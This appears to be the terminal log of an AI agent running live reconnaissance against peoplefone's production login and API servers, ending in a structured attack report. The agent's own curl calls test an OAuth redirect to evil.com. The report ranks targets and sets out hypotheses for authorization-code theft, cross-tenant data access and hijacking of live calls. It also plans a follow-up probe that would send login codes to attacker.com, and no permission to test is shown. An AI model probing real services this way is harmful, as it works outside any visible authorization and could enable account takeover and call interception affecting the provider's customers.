+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='https://auth.peoplefone.com/oauth/authorize?client_id=1&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;locale=de_CH&amp;state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5'" />
+[0m
+[0m$ [0mcurl -s -b /tmp/cookies.txt -c /tmp/cookies2.txt "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&response_type=code&scope=&locale=de_CH&state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5" 2>&1 | head -100
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5'" />
+
+        <title>Redirecting to https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5</title>
+    </head>
+    <body><a href="https://auth.peoplefone.com/cdn-cgi/content?id=j6.WQ2kXG3d2SgPMWW1mmIbgaYOj82z47NBwoY_ao2A-1788474823.8993502-1.2.1.1-tiDNH5BXmFOQXZCHFoaC4xuBGpFwFPmfH3dIo_IAnFApsZxUR7vXyuGBcZM6LwdM" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
+        Redirecting to <a href="https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5">https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5</a>.
+    </body>
+</html>
+[0m
+[0m$ [0mcurl -s -b /tmp/cookies2.txt -c /tmp/cookies3.txt "https://auth.peoplefone.com/de_CH/login?client_id=1&locale=de_CH&redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&response_type=code&scope=&state=vRdKQ6avF9ScygvWjR6JR35jJ958qsLA86PxhXs5" 2>&1 | head -100
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Peoplefone</title>
+    <!-- Google Tag Manager -->
+    <script data-cookieconsent='ignore'>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});
+                        var f=d.getElementsByTagName(s)[0],
+                            j=d.createElement(s),
+                            dl=l!='dataLayer'?'&l='+l:'';
+                        j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+                        })(window,document,'script','dataLayer','GTM-W8C3C93');
+                     </script>
+    <!-- End Google Tag Manager -->
+    
+    <link href="/css/app.css?id=7369f0a4c1f7c3d43b18" rel="stylesheet">
+    <style>
+    body {
+        background-color: #f5f7fa;
+    }
+
+    p, span {
+        color: #000000;
+    }
+
+    .container {
+        margin-top: 20px;
+    }
+
+    .wrapper {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 360px;
+        min-width: 200px;
+    }
+
+    .wrapper-login {
+        margin-left: auto;
+        margin-right: auto;
+        /*max-width: 350px;*/
+        /*min-width: 200px;*/
+    }
+
+    .wrapper-verify {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 500px;
+    }
+
+    .wrapper-dashboard {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 700px;
+        min-width: 250px;
+    }
+
+    .login-box {
+        width: 100%;
+        padding: 20px 20px;
+        background-color: white;
+        border-radius: 3px;
+
+        -webkit-box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+        -moz-box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+        box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+    }
+
+    img {
+        max-width: 150px;
+        max-height: 150px;
+        object-fit: contain;
+    }
+
+    .box-header {
+        margin-bottom: 40px;
+        color: #000000;
+        border-bottom: solid 1px #ced4da;
+    }
+
+    .box-header-login {
+        color: #000000;
+        height: 10px;
+        margin-bottom: 20px;
+    }
+
+    .card-header {
+        padding-bottom: 1px !important;
+        background-color: #9d0014 !important;
+    }
+
+    .logo {
+        width: 100%;
+        margin: 0px auto 0px auto;
+        text-align: center;
+        padding: 10px 0;
+        overflow: hidden;
+    }
+[0m
+[0m$ [0mcurl -s -c /tmp/cookies4.txt "https://portal.peoplefone.ch/login" 2>&1 | grep -o "state=[^'\"]*"
+state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx
+state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx</title>
+state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx
+state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx</a>.
+[0m
+[0m$ [0mcurl -s -b /tmp/cookies4.txt -c /tmp/cookies5.txt "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&response_type=code&scope=&locale=de_CH&state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx" 2>&1 | head -50
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;scope=&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx'" />
+
+        <title>Redirecting to https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;scope=&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx</title>
+    </head>
+    <body><a href="https://auth.peoplefone.com/cdn-cgi/content?id=OJ.6GWcVGu_8vWk5OayqqKnkppwtDrWMbxeyT9iEVHo-1788474870.326882-1.2.1.1-OjzvcQ5W9H2ODNnRrrjdUztqDi2zzRywhyW3rLPRPPmh8FF62SuqCy.n5QgFEZIH" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
+        Redirecting to <a href="https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;scope=&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx">https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;scope=&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx</a>.
+    </body>
+</html>
+[0m
+[0m$ [0mcurl -s -b /tmp/cookies5.txt -c /tmp/cookies6.txt "https://auth.peoplefone.com/de_CH/login?client_id=1&locale=de_CH&redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&response_type=code&scope=&state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx" 2>&1 | grep -i -E "(action|form|evil)" | head -20
+transform: rotate(0deg);
+            transform: rotate(360deg);
+                    <a href="https://auth.peoplefone.com/de_CH/login?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx"
+                    <a href="https://auth.peoplefone.com/fr_CH/login?client_id=1&amp;locale=fr_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx"
+                    <a href="https://auth.peoplefone.com/it_CH/login?client_id=1&amp;locale=it_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx"
+                    <a href="https://auth.peoplefone.com/en_CH/login?client_id=1&amp;locale=en_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx"
+                            <form id="loginForm" role="form" method="POST"
+                                  action="https://auth.peoplefone.com/de_CH/login">
+                                <div class="form-group">
+                                           class="form-control"
+                                <div class="form-group no-margin-bottom mt-4">
+                                           class="form-control "
+                                    <div class="cf-turnstile" data-sitekey="0x4AAAAAAETtGmlFEOhYOX2V" data-callback="turnstileSuccess" data-error-callback="turnstileError" data-theme="light" data-language="de" data-size="flexible" data-action="login" data-expired-callback="turnstileError" data-timeout-callback="turnstileError"></div>
+                            </form>
+                                   href="https://auth.peoplefone.com/de_CH/register?client_id=1&amp;locale=de_CH&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fcallback&amp;response_type=code&amp;state=FmM86Xxca04UMNsHBsdst3L9L6HjhaFjTI9Ak0sx"
+    $("form").submit(function () {
+    const loginForm = document.forms[0];
+    loginForm.addEventListener('submit', function (event) {
+<script>window.__CF$cv$params={r:'a35839f27c2a2d20',t:'MTc4ODQ3NDkxMw==',u:'01a06969758e74a08e27f57ab8f74e53',ut:'auuM3xQNpkpqym2vKgzFxKUaOeLWQetAKzvNowukOrw-1788474914-1.2.1.1-fL6ffXRhomqgXC3H7AlGtACcEVtUdrk5tilO_v1Wkq42Jx0dxNOs2vHzb_z5eLsKatVDKud5upSmWGvqj.JoHN4sOU7K.MaP.TORO3r5d_k',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script></body>
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/CallManagementV1.yml" 2>&1 | grep -A 5 -B 5 "identifier" | head -80
+examples:
+                            default:
+                                summary: list call
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: user
+            responses:
+                '200':
+                    description: Success
+                    content:
+--
+                                            - callId: "abcd"
+                                              state: "confirmed" 
+                                              direction: "incoming"
+                                              remoteParty:
+                                                type: "number"
+                                                identifier: "+41215522000"
+                                        pageNumber: 1
+                                        pageSize: 1
+                                        totalElements: 1
+                                        totalPages: 1
+                                        last: true
+--
+                                            - callId: "1"
+                                              state: "terminated" 
+                                              direction: "incoming"
+                                              remoteParty:
+                                                type: "number"
+                                                identifier: "+41215522000"
+                                            - callId: "2"
+                                              state: "confirmed"
+                                              direction: "outgoing"
+                                              remoteParty:
+                                                  type: "number"
+                                                  identifier: "+41445522000"
+                                        pageNumber: 1
+                                        pageSize: 2
+                                        totalElements: 2
+                                        totalPages: 1
+                                        last: true
+--
+                        examples:
+                            default:
+                                summary: Blind transfer
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: "user"
+                                    callId: "abcd"
+                                    destination:
+                                        identifier: "0215522000"
+                                        type: "number"
+            responses:
+                '202':
+                    description: Accepted
+                '400':
+--
+                        examples:
+                            default:
+                                summary: hold call
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: "user"
+                                    callId: "abcd"
+            responses:
+                '202':
+                    description: Accepted
+--
+                        examples:
+                            default:
+                                summary: unhold call
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: "user"
+                                    callId: "abcd"
+            responses:
+                '202':
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/ConfigApiV1.yml" 2>&1 | grep -A 10 -B 5 "identifier" | head -100
+examples:
+                default:
+                  summary: "Destination list"
+                  value:
+                    data:
+                      - identifier: "20011"
+                        name: "Standard user 11"
+                        type: "user"
+                        internalNumber: null
+                      - identifier: "1612"
+                        name: "Test queue 12"
+                        type: "queue"
+                        internalNumber: "212"
+                    pageNumber: 1
+                    pageSize: 2
+                    totalElements: 2
+                    totalPages: 1
+                    last: true
+
+  /virtualUsers/{identifier}/callforwarding:
+    get:
+      tags:
+        - "2. CallForwarding"
+      summary: Get call forwarding by Virtual User ID
+      description: >
+        Retrieves the call forwarding configuration for a specific user.
+      parameters:
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageNumber'
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageSize'
+        - name: identifier
+          in: path
+          required: true
+          schema:
+            type: string
+            description: Virtual User ID
+            example: 12345
+      responses:
+        "200":
+          description: Call forwarding details
+          content:
+--
+                    pageSize: 15
+                    totalElements: 1
+                    totalPages: 1
+                    last: true
+
+  /virtualUsers/{identifier}/callforwarding/create:
+    post:
+      tags:
+        - "2. CallForwarding"
+      summary: Create call forwarding rule for Virtual User ID
+      description: >
+        Creates a new call forwarding rule for a specific user.
+      parameters:
+        - name: identifier
+          in: path
+          required: true
+          schema:
+            type: string
+          description: Virtual User ID
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+--
+                  condition_calling_party: null
+                  condition_src_id: null
+                  destination_type: "other_number"
+                  condition_called_party_type: 0
+
+  /virtualUsers/{identifier}/callforwarding/{callforwarding_id}/status:
+    put:
+      tags:
+        - "2. CallForwarding"
+      summary: Update the status of a call forwarding rule
+      description: >
+        Updates the status of an existing call forwarding rule for a specific user.
+      parameters:
+        - name: identifier
+          in: path
+          required: true
+          description: Virtual User ID
+          schema:
+            type: string
+
+        - name: callforwarding_id
+          in: path
+          required: true
+          description: Call forwarding ID
+--
+              example:
+                code: 200
+                message: Updated
+                timestamp: "2026-08-27T08:18:56.794Z"
+
+  /virtualUsers/{identifier}/callforwarding/{callforwarding_id}:
+    put:
+      tags:
+        - "2. CallForwarding"
+[0m
+Now I have enough evidence. Let me produce the structured analysis.
+[0m$ [0mcurl -s "https://configuration-api.peoplefone.com/customer/voip/v1/destinations" -H "Authorization: Bearer invalid" 2>&1 | head -20
+{"error":{"code":401,"errorMessage":"Access token is missing or invalid","timestamp":"2026-09-03T22:36:39.092426Z"}}
+[0m
+[0m$ [0mcurl -s "https://call-api.peoplefone.com/customer/call-management/v1/call" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer invalid" -d '{"owner":{"identifier":"1234","type":"user"}}' 2>&1 | head -20
+{"error":{"code":401,"errorMessage":"Access token is missing or invalid","timestamp":"2026-09-03T22:36:54.927119Z"}}
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/customer/sms/v1/sms/messages" -H "Authorization: Bearer invalid" 2>&1 | head -20
+{"error":{"code":401,"errorMessage":"Access token is missing or invalid","timestamp":"2026-09-03T22:38:01.126105Z"}}
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/QueueApiV1.yml" 2>&1 | head -80
+openapi: 3.1.1
+info:
+  title: "Queue API | Stats v1"
+  description: |
+    ## Overview
+    Queue and agent statistics.
+
+    Period limits for statistics: maximum 6 months.
+
+    ## Documentation
+    This API provides queue and agent statistics, agent login/logout actions on queues, and logged agent listing.
+
+    Core concepts:
+    - Queue and agent identifiers use the common Entity schema (EntityType `queue` or `user` for agent).
+    - A permanent member (`permanentMembership: true`) is an agent configured as a persistent member of a queue. Such agents are automatically logged in and remain logged until removed from the queue configuration.
+
+    ## Changelog
+    ### v1.2.0 - 2026-06-11
+    * Add endpoint to list agents logged into a queue
+    ### v1.1.0 - 2026-05-21
+    * Add agent login and logout action endpoints
+    ### v1.0.0 - 2026-02-09
+    * Initial contract.
+  version: "1.2.0"
+servers:
+  - url: https://call-api.peoplefone.com/customer/queue/v1/
+    description: Production
+tags:
+  - name: "1. Queue statistics"
+    description: "Queue summary statistics."
+  - name: "2. Agent statistics"
+    description: "Agent call and login statistics."
+  - name: "3. Agent actions"
+    description: "Agent login/logout actions on queues."
+paths:
+  /queues/stats:
+    post:
+      tags:
+        - "1. Queue statistics"
+      summary: "Queue summary statistics"
+      description: |
+        Returns queue summary statistics over a period, aggregated by a time bucket.
+        Statistics cover all agents in the queue. Use /agents/stats with a queue filter for per-agent breakdown.
+        Optionally filter by call outcomes.
+        Only completed calls are included; calls still in progress are excluded.
+        All metrics are bucketed by setupTime (time the call entered the queue), ensuring that totalIncomingCalls = totalAnsweredCalls + totalAbandonedCalls + totalOverflowedCallsByTimeout + totalOverflowedCallsByCapacity within each bucket.
+      operationId: getQueueSummaryStats
+      requestBody:
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/V1QueueSummaryStatsRequestBody"
+            examples:
+              default:
+                summary: "Queue stats for a week"
+                value:
+                  period:
+                    from: "2026-02-01T00:00:00Z"
+                    to: "2026-02-07T23:59:59Z"
+                    aggregation: "day"
+                  queue:
+                    identifier: "2000"
+                    type: "queue"
+                  outcomes:
+                    - answered
+                    - abandoned
+                  pageNumber: 1
+                  pageSize: 10
+        required: true
+      responses:
+        "200":
+          description: "Queue summary statistics"
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/V1QueueSummaryStatsResponse"
+              examples:
+                default:
+                  summary: "Queue summary stats (single point)"
+                  value:
+[0m
+Now I have comprehensive data. Let me produce the structured analysis.
+
+---
+
+**STEP 1 — DELTA**
+- [NEW] OAuth authorize endpoint at `auth.peoplefone.com/oauth/authorize` accepts arbitrary `redirect_uri` for `client_id=1` (portal client) — no allowlist validation observed; redirects to `/de_CH/login` preserving attacker-controlled `redirect_uri`
+- [NEW] Configuration API (`configuration-api.peoplefone.com/customer/voip/v1`), Call Management API (`call-api.peoplefone.com/customer/call-management/v1`), Queue API (`call-api.peoplefone.com/customer/queue/v1`), SMS API (`api.peoplefone.com/customer/sms/v1`) all use bearer tokens and expose tenant-scoped object references (virtualUsers/{identifier}, callId, queue identifier, messageId) in paths/bodies
+- [CHANGED] auth.peoplefone.com OAuth flow confirmed functional via portal.peoplefone.ch → auth.peoplefone.com/oauth/authorize → /de_CH/login chain with state parameter
+- [CHANGED] Developer portal uses OpenAPI/Swagger (YAML specs), not GraphQL — GraphQL introspection hypothesis invalidated
+
+**STEP 2 — PRIORITIZE**
+[PRIO] auth.peoplefone.com,8.8,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=8,freshness=9
+[PRIO] configuration-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
+[PRIO] call-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
+[PRIO] api.peoplefone.com,7.0,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=5,cloud_surface=7,freshness=8
+[PRIO] portal.peoplefone.ch,6.5,attack_surface=6,business_value=7,tech_exposure=5,gate_ease=8,cloud_surface=7,freshness=8
+
+**STEP 3 — HYPOTHESES**
+[HYP] OAuth redirect_uri validation bypass on auth service
+class: AUTH
+asset: auth.peoplefone.com
+confidence: 85
+reasoning: OAuth authorize endpoint at /oauth/authorize accepts arbitrary redirect_uri parameter for client_id=1 (portal client); redirects to /de_CH/login preserving attacker-controlled redirect_uri without validating against pre-registered allowlist; state parameter accepted from portal login flow enables CSRF-protected authorization code theft
+evidence_needed: Successful authorization code delivery to attacker-controlled redirect_uri after victim login
+verify_steps: GET https://portal.peoplefone.ch/login (capture state); GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://evil.com/callback&response_type=code&scope=openid&state=<captured_state> (observe redirect to /de_CH/login with evil.com preserved); simulate victim login → verify code sent to evil.com
+impact: ATO via authorization code theft → cross-tenant access to calls, recordings, PBX config, billing, SMS; full account takeover of any portal user
+testability: AUTH_HELPED
+
+[HYP] IDOR/BOLA on Configuration API virtualUsers endpoints
+class: IDOR
+asset: configuration-api.peoplefone.com
+confidence: 75
+reasoning: Configuration API exposes /virtualUsers/{identifier}/callforwarding (GET/POST/PUT) with identifier in path; OpenAPI spec explicitly states "user must be part of the account bound to the bearer token" — indicating authorization boundary exists; multi-tenant VoIP platform with numeric identifiers (e.g., "12345") likely sequential; bearer token auth only validates token validity, not resource ownership
+evidence_needed: Valid bearer token from tenant A returns call forwarding config for tenant B's virtualUser identifier
+verify_steps: GET https://configuration-api.peoplefone.com/customer/voip/v1/virtualUsers/{other_tenant_id}/callforwarding with valid bearer token from tenant A (requires authenticated session); enumerate identifier space via /destinations to discover valid virtualUser IDs
+impact: Cross-tenant PII dump — call forwarding rules, PBX configuration, user extensions, routing logic; potential call interception via forwarding rule modification
+testability: AUTH_HELPED
+
+[HYP] IDOR/BOLA on Call Management API call control endpoints
+class: IDOR
+asset: call-api.peoplefone.com
+confidence: 70
+reasoning: Call Management API exposes /call (POST), /call/blind-transfer (POST), /call/hold (POST), /call/unhold (POST) accepting owner.identifier in request body; spec notes "owner entity must be of type user, and this user must be part of the account bound to the bearer token"; callId returned in responses could be predicted or leaked; blind-transfer allows call hijacking to attacker-controlled number
+evidence_needed: Valid bearer token from tenant A performs blind-transfer on tenant B's callId/owner.identifier
+verify_steps: POST https://call-api.peoplefone.com/customer/call-management/v1/call with owner.identifier=victim_user_id (requires authenticated session); POST /call/blind-transfer with victim callId and attacker destination
+impact: Live call interception, call hijacking, call recording access, denial of service via hold/unhold abuse
+testability: AUTH_HELPED
+
+**STEP 4 — SELF-CRITIQUE**
+[PARKED] GraphQL introspection enabled on developer portal API: Developer portal uses OpenAPI/Swagger YAML specs, no GraphQL endpoint discovered at www.peoplefone.com/en-ch/developer or api.peoplefone.com/services/api-doc/
+[FINAL] 1. OAuth redirect_uri validation bypass on auth service (confidence 85)
+[FINAL] 2. IDOR/BOLA on Configuration API virtualUsers endpoints (confidence 75)
+[FINAL] 3. IDOR/BOLA on Call Management API call control endpoints (confidence 70)
+
+**STEP 5 — NEXT ACTION**
+[NEXT] PROBE: GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://attacker.com/callback&response_type=code&scope=openid&state=<fresh_state_from_portal_login> → follow redirect chain to /de_CH/login → verify redirect_uri preserved in login form action → complete login flow (requires test account) → confirm authorization code delivered to attacker.com/callback
+
+**STEP 6 — LEARNING**
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: OAuth authorize endpoint lacks redirect_uri allowlist validation for client_id=1; arbitrary redirect_uri accepted and preserved through login flow
+[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Multi-tenant API exposes virtualUsers/{identifier} endpoints with explicit authorization boundary notes in spec
+[LEARN] ACCEPTED IDOR @ call-api.peoplefone.com: Call control endpoints accept owner.identifier in body with authorization boundary notes
+[LEARN] REJECTED MISCONFIG @ www.peoplefone.com: GraphQL introspection hypothesis invalidated — developer portal uses OpenAPI/Swagger, not GraphQL
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Wildcard DNS dominated by Cloudflare CDN CNAMEs; no dangling third-party targets observed
+
+**STEP 7 — RISK**
+[RISK] peoplefone: 82 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing, PBX config); OAuth redirect_uri bypass enables ATO without credentials; IDOR on configuration/call APIs enables cross-tenant data access and call hijacking; auth + API surface confirmed with documented authorization boundaries; wildcard DNS limits subdomain attack surface but core auth/API assets remain critical
